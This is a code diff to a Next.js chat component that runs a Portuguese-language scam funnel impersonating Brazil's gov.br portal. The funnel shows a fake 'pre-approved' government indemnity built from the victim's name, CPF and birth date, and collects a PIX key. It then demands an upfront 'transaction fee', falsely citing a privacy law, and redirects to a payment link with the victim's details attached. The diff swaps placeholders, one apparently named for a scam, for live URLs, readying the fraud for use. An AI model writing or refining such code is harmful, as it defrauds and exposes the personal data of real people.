@@ -2,8 +2,7 @@
 "use client";
 
 import React, { useState, useEffect, useRef, useMemo } from 'react';
-import { useRouter } // useRouter is not used but might be in future, so keeping import
-from 'next/navigation'; 
+import { useRouter } from 'next/navigation'; 
 import Image from 'next/image';
 import { Loader2, VolumeX, CheckCircle, AlertTriangle } from 'lucide-react';
 import dynamic from 'next/dynamic';
@@ -32,11 +31,9 @@ interface Message {
   text?: string;
   options?: ChatOption[];
   isTyping?: boolean;
-  // For displayMessage type
   displayTitle?: string;
   displayDetails?: Record<string, string>;
   displayIcon?: 'success_checkmark' | 'alert';
-  // For displayImage type
   displayImageUrl?: string;
   displayImageAlt?: string;
   displayImageAiHint?: string;
@@ -73,7 +70,7 @@ interface StepDataDisplayMessage {
 }
 
 interface StepDataDisplayImage {
-  message: string;
+  message?: string; // Optional message to accompany image
   imageUrl: string;
   imageAiHint?: string;
 }
@@ -98,7 +95,7 @@ const funnelDefinition: FunnelData = {
         "type": "video",
         "data": {
           "title": "Primeiro clique no vídeo abaixo para iniciarmos o atendimento 👇",
-          "videoUrl": "https://placeholder.url/video_golpe.mp4" // Placeholder, actual video recommended
+          "videoUrl": "https://225412.b-cdn.net/Video%20Page.mp4" 
         },
         "nextStep": "step2_ask_mother_name"
       },
@@ -109,7 +106,7 @@ const funnelDefinition: FunnelData = {
           "options": [
             {"text": "Raquel Queiroz Santos", "nextStep": "step3_ask_gov_app"},
             {"text": "Fernanda de Sousa Rodrigues", "nextStep": "step3_ask_gov_app"},
-            {"text": "{mae}", "nextStep": "step3_ask_gov_app"}, // Dynamic mother's name placeholder
+            {"text": "{mae}", "nextStep": "step3_ask_gov_app"}, 
             {"text": "Nenhuma das alternativas.", "nextStep": "step3_ask_gov_app"}
           ]
         }
@@ -149,14 +146,14 @@ const funnelDefinition: FunnelData = {
         "data": {
           "title": "Autenticidade confirmada!",
           "icon": "success_checkmark",
-          "details": { // Details will be dynamically populated
+          "details": { 
             "Nome": "{nome}",
             "CPF": "{cpf}",
             "Data de Nascimento": "{nascimento}",
             "Indenização": "R$ 5.960,50",
             "Status": "Pré-aprovado"
           },
-          "audioUrl": "https://placehold.co/audio_aprovado.mp3" // Placeholder audio
+          "audioUrl": "https://placehold.co/audio_aprovado.mp3" 
         },
         "nextStep": "step7_ask_pix_type"
       },
@@ -195,12 +192,12 @@ const funnelDefinition: FunnelData = {
             "title": "Chave PIX Cadastrada",
             "icon": "success_checkmark",
             "message": "Sua chave pix foi cadastrada com sucesso!",
-            "details": { // Details will be dynamically populated
+            "details": { 
               "Nome": "{nome}",
               "Chave Pix": "{cpf}",
               "Status": "Aprovado"
             },
-            "audioUrl": "https://placehold.co/audio_chave_cadastrada.mp3" // Placeholder audio
+            "audioUrl": "https://placehold.co/audio_chave_cadastrada.mp3" 
           },
           "nextStep": "step11_ask_generate_receipt"
       },
@@ -217,7 +214,7 @@ const funnelDefinition: FunnelData = {
           "type": "displayImage",
           "data": {
               "message": "Gerando seu comprovante de recebimento dos valores...",
-              "imageUrl": "https://placehold.co/600x400.png", // Placeholder image
+              "imageUrl": "https://placehold.co/600x400.png", 
               "imageAiHint": "receipt document"
           },
           "nextStep": "step13_reveal_tax"
@@ -226,7 +223,7 @@ const funnelDefinition: FunnelData = {
           "type": "displayMessage",
           "data": {
               "title": "Indenização Governamental",
-              "details": { // Details will be dynamically populated where possible
+              "details": { 
                   "Indenização disponível para saque": "R$ 5.960,50",
                   "Titular": "{nome}",
                   "Chave Pix": "{cpf}",
@@ -240,7 +237,7 @@ const funnelDefinition: FunnelData = {
           "data": {
               "message": "⚠️ Seu dinheiro está vinculado ao seu CPF e somente você pode acessá-lo.\n\nPortanto, a taxa transacional paga ao solicitar o saque, não pode ser descontada do valor total que você tem a receber, devido à Lei que protege os direitos fundamentais de Privacidade e Segurança.\n\nLei n.º 13.709 de 14 de agosto de 2018",
               "options": [
-                  {"text": "Concluir pagamento e receber minha indenização", "action": "redirectToPayment", "paymentUrl": "https://pay.finalizeseupagamento.com/2wq7Gr7YK5jgBAN"} // Example URL
+                  {"text": "Concluir pagamento e receber minha indenização", "action": "redirectToPayment", "paymentUrl": "https://pay.finalizeseupagamento.com/2wq7Gr7YK5jgBAN"}
               ]
           }
       }
@@ -254,22 +251,20 @@ const SimulatedChatFlow: React.FC<{ initialParams: SimulatedChatParams }> = ({ i
   const [isBotTyping, setIsBotTyping] = useState(true);
   const chatEndRef = useRef<HTMLDivElement>(null);
   const audioRef = useRef<HTMLAudioElement>(null);
+  const router = useRouter();
 
-  // Video state
   const playerRef = useRef<PlyrInstance | null>(null);
   const [showVideoThumbnailOverlay, setShowVideoThumbnailOverlay] = useState(true);
   const [currentVideoUrl, setCurrentVideoUrl] = useState<string | null>(null);
 
-  // Loading step state
   const [isLoadingStep, setIsLoadingStep] = useState(false);
   const [loadingMessage, setLoadingMessage] = useState<string | null>(null);
 
-  // DisplayImage step state
   const [currentImageDetails, setCurrentImageDetails] = useState<{url: string; alt: string; message?: string, aiHint?: string} | null>(null);
-  
-  // DisplayMessage step state
   const [currentDisplayMessage, setCurrentDisplayMessage] = useState<Message | null>(null);
 
+  const prevCurrentStepKeyRef = useRef<string>();
+  const autoTransitionTimerRef = useRef<NodeJS.Timeout | null>(null);
 
   const formatText = (text: string | undefined): string => {
     if (!text) return '';
@@ -289,38 +284,50 @@ const SimulatedChatFlow: React.FC<{ initialParams: SimulatedChatParams }> = ({ i
     return formatted;
   };
 
-
   useEffect(() => {
     chatEndRef.current?.scrollIntoView({ behavior: 'smooth' });
-  }, [messages, isLoadingStep, currentImageDetails, currentDisplayMessage]);
+  }, [messages, isLoadingStep, currentImageDetails, currentDisplayMessage, currentVideoUrl]);
 
   useEffect(() => {
+    if (autoTransitionTimerRef.current) {
+      clearTimeout(autoTransitionTimerRef.current);
+      autoTransitionTimerRef.current = null;
+    }
+
     const stepConfig = funnelDefinition.steps[currentStepKey];
     if (!stepConfig) {
       console.error("SimulatedChatFlow: Invalid step key:", currentStepKey);
+      setMessages(prev => [...prev, {id: `err-${Date.now()}`, sender: 'bot', text: "Desculpe, ocorreu um erro no fluxo."}]);
+      setIsBotTyping(false);
       return;
     }
+
+    const isNewStep = prevCurrentStepKeyRef.current !== currentStepKey;
+    prevCurrentStepKeyRef.current = currentStepKey;
 
     setIsBotTyping(true);
     setIsLoadingStep(false);
     setLoadingMessage(null);
     setCurrentImageDetails(null);
     setCurrentDisplayMessage(null);
-    setCurrentVideoUrl(null);
+    
+    if (stepConfig.type !== 'video' && isNewStep) {
+      setCurrentVideoUrl(null); // Clear video if moving to a non-video step
+    }
+
 
     const processStep = async () => {
       const botMessageId = `bot-${Date.now()}`;
-      let nextStepTransitionDelay = 1200; // Default delay for auto-transitions
+      let nextStepTransitionDelay = 1200; 
 
       switch (stepConfig.type) {
         case 'video': {
           const data = stepConfig.data as StepDataVideo;
-          setCurrentVideoUrl(data.videoUrl); // Show video player
+          setCurrentVideoUrl(data.videoUrl);
           setShowVideoThumbnailOverlay(true);
-          if (data.title) {
+          if (data.title && isNewStep) {
             setMessages(prev => [...prev, { id: botMessageId, sender: 'bot', text: formatText(data.title) }]);
           }
-          // Video interaction will trigger next step via handleVideoThumbnailClick
           setIsBotTyping(false);
           return; 
         }
@@ -330,22 +337,32 @@ const SimulatedChatFlow: React.FC<{ initialParams: SimulatedChatParams }> = ({ i
             ...opt,
             text: formatText(opt.text)
           }));
-          setMessages(prev => [...prev, { id: botMessageId, sender: 'bot', text: formatText(data.message), options: formattedOptions }]);
+          if (isNewStep) {
+            setMessages(prev => [...prev, { id: botMessageId, sender: 'bot', text: formatText(data.message), options: formattedOptions }]);
+          } else if (messages[messages.length-1]?.options?.length !== formattedOptions.length) { // Ensure options are resent if they differ (e.g. due to param update)
+            setMessages(prev => {
+                const lastMsg = prev[prev.length -1];
+                if(lastMsg.sender === 'bot' && lastMsg.text === formatText(data.message)){ // update last message if text is same
+                    return [...prev.slice(0, -1), {...lastMsg, options: formattedOptions}];
+                }
+                return [...prev, { id: botMessageId, sender: 'bot', text: formatText(data.message), options: formattedOptions }];
+            });
+          }
           break;
         }
         case 'loading': {
           const data = stepConfig.data as StepDataLoading;
           setLoadingMessage(formatText(data.message));
           setIsLoadingStep(true);
-          setIsBotTyping(false); // Typing indicator not needed during loading screen
-          setTimeout(() => {
+          setIsBotTyping(false); 
+          autoTransitionTimerRef.current = setTimeout(() => {
             setIsLoadingStep(false);
             setLoadingMessage(null);
             if (stepConfig.nextStep) {
               setCurrentStepKey(stepConfig.nextStep);
             }
           }, data.duration_ms);
-          return; // Return early as transition is handled by timeout
+          return; 
         }
         case 'displayMessage': {
           const data = stepConfig.data as StepDataDisplayMessage;
@@ -353,52 +370,55 @@ const SimulatedChatFlow: React.FC<{ initialParams: SimulatedChatParams }> = ({ i
             id: botMessageId,
             sender: 'bot',
             displayTitle: formatText(data.title),
-            text: data.message ? formatText(data.message) : undefined, // Use text for main message if present
+            text: data.message ? formatText(data.message) : undefined,
             displayDetails: formatDetailsObject(data.details),
             displayIcon: data.icon,
           };
-          setCurrentDisplayMessage(displayMsg); // Use state to render this special message block
+          setCurrentDisplayMessage(displayMsg); 
 
           if (data.audioUrl && audioRef.current) {
             audioRef.current.src = data.audioUrl;
             audioRef.current.play().catch(e => console.warn("Audio autoplay failed:", e));
           }
-          nextStepTransitionDelay = 3500; // Longer delay for user to read message
+          nextStepTransitionDelay = 3500; 
           break;
         }
         case 'displayImage': {
           const data = stepConfig.data as StepDataDisplayImage;
-           if (data.message) {
+           if (data.message && isNewStep) {
              setMessages(prev => [...prev, { id: botMessageId, sender: 'bot', text: formatText(data.message) }]);
            }
-          setCurrentImageDetails({url: data.imageUrl, alt: "Comprovante", message: formatText(data.message), aiHint: data.imageAiHint || 'document image'});
-          nextStepTransitionDelay = 4000; // Longer delay for user to see image
+          setCurrentImageDetails({url: data.imageUrl, alt: "Comprovante", message: data.message ? formatText(data.message) : undefined, aiHint: data.imageAiHint || 'document image'});
+          nextStepTransitionDelay = 4000; 
           break;
         }
         default:
-          console.error("SimulatedChatFlow: Unknown step type:", stepConfig.type);
+          console.error("SimulatedChatFlow: Unknown step type:", (stepConfig as any).type);
+          setMessages(prev => [...prev, {id: `err-type-${Date.now()}`, sender: 'bot', text: "Erro: tipo de passo desconhecido."}]);
       }
 
       setIsBotTyping(false);
 
-      // Auto-transition if nextStep is defined and not handled by options or video
-      if (stepConfig.nextStep && stepConfig.type !== 'multipleChoice' && stepConfig.type !== 'video') {
-        setTimeout(() => {
-          if (currentStepKey === stepConfig.nextStep) { // Check if we are still on the same step, to avoid race conditions
-             console.warn("SimulatedChatFlow: Avoiding re-transition to the same step:", stepConfig.nextStep);
-             return;
-          }
-          setCurrentStepKey(stepConfig.nextStep);
-        }, nextStepTransitionDelay);
+      if (stepConfig.nextStep && stepConfig.type !== 'multipleChoice' && stepConfig.type !== 'video' && stepConfig.type !== 'loading') {
+        if (isNewStep) { // Only auto-transition if it's a genuinely new step
+            autoTransitionTimerRef.current = setTimeout(() => {
+            setCurrentStepKey(stepConfig.nextStep as string);
+          }, nextStepTransitionDelay);
+        }
       }
     };
-
-    // Delay bot message appearance for simulation
-    const appearanceDelay = (stepConfig.type === 'loading' || currentStepKey === funnelDefinition.initialStep) ? 0 : 700;
+    
+    const appearanceDelay = (stepConfig.type === 'loading' || (isNewStep && currentStepKey === funnelDefinition.initialStep)) ? 0 : 700;
     setTimeout(processStep, appearanceDelay);
 
+    return () => {
+      if (autoTransitionTimerRef.current) {
+        clearTimeout(autoTransitionTimerRef.current);
+        autoTransitionTimerRef.current = null;
+      }
+    };
   // eslint-disable-next-line react-hooks/exhaustive-deps
-  }, [currentStepKey, initialParams]); // initialParams included to re-evaluate messages if they change (though unlikely for this app's structure)
+  }, [currentStepKey, initialParams]); 
 
   const handleOptionClick = (option: ChatOption) => {
     const userMessageId = `user-${Date.now()}`;
@@ -406,17 +426,18 @@ const SimulatedChatFlow: React.FC<{ initialParams: SimulatedChatParams }> = ({ i
 
     if (option.action === 'redirectToPayment' && option.paymentUrl) {
         let finalPaymentUrl = option.paymentUrl;
-        // Append initialParams to payment URL if not already there
         const url = new URL(finalPaymentUrl);
         Object.entries(initialParams).forEach(([key, value]) => {
             if (value && !url.searchParams.has(key)) {
                 url.searchParams.set(key, value);
             }
         });
-        if (initialParams.cpf && !url.searchParams.has('document')) { // Specific mapping for 'document'
+        if (initialParams.cpf && !url.searchParams.has('document')) { 
             url.searchParams.set('document', initialParams.cpf.replace(/\D/g, ''));
         }
-
+        if (initialParams.nome && !url.searchParams.has('name')) {
+            url.searchParams.set('name', initialParams.nome);
+        }
         window.location.href = url.toString();
     } else if (option.nextStep) {
       setCurrentStepKey(option.nextStep);
@@ -425,7 +446,7 @@ const SimulatedChatFlow: React.FC<{ initialParams: SimulatedChatParams }> = ({ i
   
   const handleVideoThumbnailClick = async () => {
     const stepConfig = funnelDefinition.steps[currentStepKey];
-    if (stepConfig.type !== 'video') return;
+    if (stepConfig?.type !== 'video') return;
 
     if (playerRef.current?.plyr) {
       try {
@@ -434,16 +455,15 @@ const SimulatedChatFlow: React.FC<{ initialParams: SimulatedChatParams }> = ({ i
         setShowVideoThumbnailOverlay(false);
         
         if (stepConfig.nextStep) {
-          setTimeout(() => {
+          autoTransitionTimerRef.current = setTimeout(() => { // Use timer for consistency
             setCurrentStepKey(stepConfig.nextStep as string);
-          }, 500); // Short delay after video starts
+          }, 500); 
         }
       } catch (error) {
         console.error("Error trying to play/unmute video:", error);
-        if (stepConfig.nextStep) setCurrentStepKey(stepConfig.nextStep as string); // Proceed even if play fails
+        if (stepConfig.nextStep) setCurrentStepKey(stepConfig.nextStep as string); 
       }
     } else {
-        // Fallback if player isn't ready, though unlikely with dynamic import
         if (stepConfig.nextStep) setCurrentStepKey(stepConfig.nextStep as string);
     }
   };
@@ -507,7 +527,7 @@ const SimulatedChatFlow: React.FC<{ initialParams: SimulatedChatParams }> = ({ i
       
       {currentDisplayMessage && (
         <div className={`message-container bot-message-container display-message-block`} style={{alignSelf: 'flex-start', maxWidth: '90%'}}>
-           <img src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot Avatar" className="bot-avatar" />
+           <Image src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot Avatar" className="bot-avatar" width={32} height={32} />
            <div className="message bot-message" style={{width: '100%'}}>
               {currentDisplayMessage.displayTitle && <h3 style={{ fontWeight: 'bold', marginBottom: '8px', fontSize: '17px', color: '#0056b3' }}>
                 {currentDisplayMessage.displayIcon === 'success_checkmark' && <CheckCircle size={20} style={{ color: 'green', marginRight: '8px', verticalAlign: 'bottom' }} />}
@@ -533,7 +553,7 @@ const SimulatedChatFlow: React.FC<{ initialParams: SimulatedChatParams }> = ({ i
       {messages.map((msg) => (
           <div key={msg.id} className={`message-container ${msg.sender === 'bot' ? 'bot-message-container' : 'user-message-container'}`}>
             {msg.sender === 'bot' && (
-              <img src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot Avatar" className="bot-avatar" />
+              <Image src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot Avatar" className="bot-avatar" width={32} height={32} />
             )}
             <div className={`message ${msg.sender === 'bot' ? 'bot-message' : 'user-message'}`}>
               {msg.text && <span style={{whiteSpace: 'pre-line'}}>{msg.text}</span>}
@@ -541,7 +561,7 @@ const SimulatedChatFlow: React.FC<{ initialParams: SimulatedChatParams }> = ({ i
                 <div className="options-container" style={{ marginTop: msg.text ? '10px' : '0', display: 'flex', flexDirection: 'column', gap: '8px' }}>
                   {msg.options.map(opt => (
                     <button
-                      key={opt.text} // Using text as key for simplicity, ensure unique if text can repeat
+                      key={opt.text} 
                       onClick={() => handleOptionClick(opt)}
                       className="chat-option-button"
                     >
@@ -556,7 +576,7 @@ const SimulatedChatFlow: React.FC<{ initialParams: SimulatedChatParams }> = ({ i
       )}
       {isBotTyping && (
          <div className="message-container bot-message-container">
-            <img src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot Avatar" className="bot-avatar" />
+            <Image src="https://sso.acesso.gov.br/assets/govbr/img/govbr.png" alt="Bot Avatar" className="bot-avatar" width={32} height={32} />
             <div className="message bot-message typing-indicator">
                 <span className="dot"></span>
                 <span className="dot"></span>
@@ -578,13 +598,13 @@ const SimulatedChatFlow: React.FC<{ initialParams: SimulatedChatParams }> = ({ i
           align-self: flex-end;
           flex-direction: row-reverse; 
         }
-        .bot-avatar {
+        .bot-avatar { /* Applied to Image component via className */
           width: 32px;
           height: 32px;
           border-radius: 50%;
           margin-right: 8px;
           margin-top: 4px; 
-          align-self: flex-start; /* Ensure avatar stays at the top of the message bubble */
+          align-self: flex-start; 
         }
         .user-message-container .bot-avatar { 
           display: none;
@@ -660,8 +680,8 @@ const SimulatedChatFlow: React.FC<{ initialParams: SimulatedChatParams }> = ({ i
             0%, 80%, 100% { transform: scale(0); }
             40% { transform: scale(1); }
         }
-        .display-message-block .bot-message { /* Ensure displayMessage blocks span more width */
-            width: 100%; /* Make the bubble take more width */
+        .display-message-block .bot-message { 
+            width: 100%; 
         }
       `}</style>
     </div>
@@ -669,5 +689,3 @@ const SimulatedChatFlow: React.FC<{ initialParams: SimulatedChatParams }> = ({ i
 };
 
 export default SimulatedChatFlow;
-
-    
